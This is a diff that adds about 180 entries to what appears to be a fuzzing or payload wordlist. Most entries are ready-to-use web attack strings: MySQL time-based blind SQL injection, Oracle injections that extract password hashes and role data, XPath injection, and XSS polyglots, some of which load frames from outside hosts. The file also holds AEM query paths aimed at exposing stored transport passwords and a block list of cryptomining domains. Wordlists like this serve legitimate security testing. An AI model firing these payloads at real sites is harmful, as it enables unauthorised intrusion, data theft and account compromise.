@@ -1,3 +1,182 @@
+"),(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))#
+"),(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
+"),(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+"),(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))%23
+"),(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
+"),(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+"*://*.2giga.link/js*",
+"*://*.coin-hive.com/captcha/*",
+"*://*.coin-hive.com/lib/*",
+"*://*.coin-hive.com/proxy/*",
+"*://*.coin-hive.com/server/*",
+"*://*.coinhive.com/captcha/*",
+"*://*.coinhive.com/lib/*",
+"*://*.coinhive.com/proxy/*",
+"*://*.coinhive.com/server/*",
+"*://*.edgeno.de/*",
+"*://*.jsecoin.com/captcha/*",
+"*://*.jsecoin.com/lib/*",
+"*://*.jsecoin.com/proxy/*",
+"*://*.jsecoin.com/server/*",
+"*://*.jyhfuqoh.info/*",
+"*://*.listat.biz/*",
+"*://*.lmodr.biz/*",
+"*://*.mataharirama.xyz/*",
+"*://*.minecrunch.co/web/*",
+"*://*.minemytraffic.com/captcha/*"
+"*://*.minemytraffic.com/lib/*",
+"*://*.minemytraffic.com/proxy/*",
+"*://*.minemytraffic.com/server/*",
+"*://*.reasedoper.pw/*",
+",(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))#
+",(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
+",(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+",(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))%23
+",(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
+",(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+"exp/*<a style='no\xss:noxss(""*//*"");xss:ex/*xss*//*/*/pression(alert(""xss""))'>"
+"http://*:*@www" bob:bob
+"http://*:*@www" domainname
+"http://*:*@www” domainname
+' and 1=utl_inaddr.get_host_address((select count(distinct(column_name)) from sys.all_tab_columns)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select count(distinct(granted_role)) from dba_role_privs where grantee=sys.login_user)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select count(distinct(password)) from sys.user$)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select count(distinct(table_name)) from sys.all_tables)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select count(distinct(username)) from sys.all_users)) and 'i'='i
+' and count(/*)=1 and '1'='1
+' and count(/@*)=1 and '1'='1
+' and count(/comment())=1 and '1'='1
+'';!--<xss>=&{()}"count(/child::node())
+'),(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))#
+'),(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
+'),(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+'),(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))%23
+'),(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
+'),(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+',(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))#
+',(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
+',(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+',(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))%23
+',(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
+',(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+),(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))#
+),(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
+),(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+),(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))%23
+),(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
+),(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+*//35be16go23//*
+*{background:url(xx:x //**/\red/*)} /* ie 6-7 standards mode */
++++++/////*****
++-*//*-+
+,(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))#
+,(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
+,(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+,(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))%23
+,(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
+,(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+-*//*-
+-*//*-+
+-1exp/*<a style='no\crosssitescripting:nocrosssitescripting("*//*");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>
+/*http://*/pdt*
+/*https://*/pdt*
 //*
-count(/child::node())
+/content/add_valid_page.query.json?statement=//*
+/content/add_valid_path_to_a_page.query.json?statement=//*
+/content/we-retail.query.json?statement=//*
+06655//**
+1' and 1=(select count(*) from tablenames); --
+1234//**
+123456//*
+123456789//**
+140876_mm//*
+1576//*
+168566044//**
+1972103//**
+1982//**
+210587**mayo//*
+308008417//**
+33833//*
+345"%5d|//*|/a%5b"a
+345")%5d|//*|/a%5bcontains(a,"b
+345'%5d|//*|/a%5b'a
+345')%5d|//*|/a%5bcontains(a,'b
+6256177//**
+62629270//**
+85746571//**
+</textarea><iframe src=http://sn1persecurity.com/.testing/xss_vuln.html onload=prompt(7) onmouseover=alert(8) onerror=prompt(9)><!--//*injectx
+</textarea><iframe src=http://xerosecurity.com/.testing/xss_vuln.html onload=prompt(7) onmouseover=alert(8) onerror=prompt(9)><!--//*injectx
+</textarea><iframe src=https://crowdshield.com/.testing/xss_vuln.html onload=prompt(25) onmouseover=alert(26) onerror=prompt(27)><!--//*injectx
+<code>exp/*&lt;xss style=&apos;no\xss:noxss(&quot;*//*&quot;);
+<code>exp/*&lt;xss style='no\xss:noxss(&quot;*//*&quot;);xss:&amp;#101;x&amp;#x2f;*xss*//*/*/pression(alert(&quot;xss&quot;))'&gt;</code>
+<crosssitescripting style="crosssitescripting:expression(alert('crosssitescripting'))">  exp/*<a style='no\crosssitescripting:nocrosssitescripting("*//*");  crosssitescripting:ex&#x2f;*crosssitescripting*//*/*/pression(alert("crosssitescripting"))'>
+<iframe src=http://sn1persecurity.com/.testing/xss_vuln.html onload=prompt(4) onmouseover=alert(5) onerror=prompt(6)><!--//*injectx
+<iframe src=http://xerosecurity.com/.testing/xss_vuln.html onload=prompt(4) onmouseover=alert(5) onerror=prompt(6)><!--//*injectx
+<iframe src=https://crowdshield.com/.testing/xss_vuln.html onload=prompt(22) onmouseover=alert(23) onerror=prompt(24)><!--//*injectx
+<style>//*{x:expression(alert(/xss/))}//<style></style>
+>"exp/*<a style='no\crosssitescripting:nocrosssitescripting("*//*");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>
+aa//**181914
+account(imcompleto).xml
+agdez//**--
+alger16//**
+and (select 4523 from(select count(*),concat(0x716a7a6a71,(select (elt(4523=4523,1))),0x71706a6b71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)
+and (select count(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%' ) < number_of_table
+content/add_valid_page.qu%65ry.js%6fn?statement=//*
+content/add_valid_page.qu9665ry.js%6fn?statement=//*
+content/add_valid_page.query.json?statement=//*
+content/add_valid_page.query.json?statement=//* #/(@transportpassword%20|%20@transporturi%20|%20@transportuser)
+content/add_valid_page.query.json?statement=//*[@transportpassword]/(@transportpassword%20|%20@transporturi%20|%20@transportuser)
+content/add_valid_page.query.json?statements//*
+contra///***
 count(//*[position()=1])
+count(/child::node())
+csc@@@//**988110
+ec//*+/
+exp/*&lt;a style='no\x:nox("*//*");
+exp/*&lt;a style='no\xss&#58;noxss(\"*//*\");
+exp/*&lt;xss style=&apos;no\xss:noxss(&quot;*//*&quot;);
+exp/*<;xss style=';no\xss:noxss(";*//*";);
+exp/*<a style='no\crosssitescripting:nocrosssitescripting("*//*");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>
+exp/*<a style='no\x:nox("*//*");x:&#101;x&#x2f;*x*//*/*/pression(alert(1))'>
+exp/*<a style='no\x:nox("*//*");x:ex/*x*//*/*/pression(alert("x"))'>
+exp/*<a style='no\xss:noxss("*//*");
+exp/*<a style='no\xss:noxss("*//*");xss:&#101;x&#x2f;*xss*//*/*/pression(alert("xss"))'>
+exp/*<a style='no\xss:noxss("*//*");xss:ex/*xss*//*/*/pression(alert("xss"))'>
+exp/*<a style='no\xss:noxss("*//*");xss:ex/*xss*//*/*/pression(alert(1010))'>
+exp/*<a style='no\xss:noxss("*//*");xss:ex/*xss*//*/*/pression(document.vulnerable=true)'>
+exp/*<xss style='no\xss:noxss("*//*");
+exp/*<xss style='no\xss:noxss("*//*");xss:&#101;x&#x2f;*xss*//*/*/pression(alert("xss"))'>
+exploit string: exp/*<xss style='no\xss:noxss("*//*");xss:&#101;x&#x2f;*xss*//*/*/pression(alert("xss"))'>
+javascript:/*"/*'/*`/*\"/**/ alert()//*</title></textarea></style></noscript></noembed></template></option></select></script>--><<svg onload=alert()><frame src=javascript:alert()>
+javascript:/*-- >]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=/alert(1)/.source]<img - /style=a:expression&#40&#47&#42'/- /*&#39,/**/eval(name)/*%2a///*///&#41;;width:100%;height:100%;position:absolute;-ms- behavior:url(#default#time2) name=alert(1)onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascript:eval(name)//>"
+javascript:/*-- >]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=/alert(1)/.source]<img - /style=a:expression&#40&#47&#42'/- /*&#39,/**/eval(name)/*%2a///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=alert(1)onerror=eval(name) src=1 autofocus onfocus=eval(name)onclick=eval(name) onmouseover=eval(name) onbegin=eval(name)background=javascript:eval(name)//>"
+javascript:/*-->]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=/alert(1)/.source]<img -/style=a:expression&#40&#47&#42'/-/*&#39,/**/eval(name)/*%2a///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascript:eval(name)//>"
+javascript:/*`//'//\"//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame <svg"///*/ onload=alert()//</script>
+javascript:alert()//'//"//\"//-->`//*/ alert();//</title></textarea></style></noscript></noembed></template><frame onload=alert()></select></script><<svg onload=alert()>
+javascript:alert()//'//"//`//></a></option></select></template></noscript></script></title></style></textarea></noembed>--><<svg onload=alert()>\">alert()//*/ alert()//<frame src=javascript:alert()>
+javascript:alert()//*-->*`/*'/*"/*\"/*</title></textarea></style></noscript></noembed></template><frame src=javascript:alert()></script><script>/*<svg onload=alert()>*/ alert()//</script>
+javascript:alert()//*/alert()/*'-/"/-eval(`(alert())`)//\"-alert()//--></title></style></noscript></textarea></template></noembed><script>alert()</script><frameset onload=alert()><svg/onload=alert(1)> alert()//
+javascript:alert()//<frame/src=javascript:alert()><svg/onload=alert()>`;alert()`';alert()//\";alert();//"//--></title></textarea></style></noscript></noembed></template></option></select></script><svg onload=alert()>*/ alert()//*
+javascript:alert();//<img src=x:x onerror=alert(1)>\";alert();//";alert();//';alert();//`;alert();// alert();//*/alert();//--></title></textarea></style></noscript></noembed></template></select></script><frame src=javascript:alert()><svg onload=alert()><!--
+jiif///***
+length_true=`echo $response | cut -d ":" -f 2`      #1 or count(parent::*[position()=1])=0
+mozilla/4.0 (compatible; msie 7.0; windows nt 6.2; win64; x64; trident/7.0; .net4.0c; .net4.0e; .net clr 2.0.50727; .net clr 3.0.30729; .net clr 3.5.30729; *://*.lowes.com)
+mozilla/5.0 (windows nt 6.2; win64; x64; trident/7.0; *://*.lowes.com; rv:11.0) like gecko
+qqq123456ppp//*
+qsu=-719//*-928
+quan.266//**
+selectt.,(selectcount()fromcityasttwherett.name=t.name)ascountfromcityastwhere(selectcount()fromcityasttwherett
+sword//*/
+tag//*
+wl////****
+won**//**//21
+wwtt28//*
+x' and 1=(select count(*) from tabname); --
+xss&#58;ex&#x2f;*xss*//*/*/pression(alert(\"xss\"))'&gt;
+xss:&#101;x&#x2f;*xss*//**pression(alert("xss"))'>
+xss:&#101;x&#x2f;*xss*//*/*/pression(alert("xss"))'>
+xss:&amp;#101;x&amp;#x2f;*xss*//*/*/pression(alert(&quot;xss&quot;))&apos;&gt;</code>
+xss:ex/*xss*//*/*/pression(alert("xss"))'>
+xxx<style>*{color:gre/**/en !/**/important} /* ie 6-9 standards mode */<!----><!--*{color:red}   /* all ua */*{background:url(xx:x //**/\red/*)} /* ie 6-7 standards mode */</style>
+xxx<style>*{color:gre/**/en !/**/important}*{color:red}*{background:url(xx:x //**/\red/*)}</style>
+“http://*:*@www” domainname
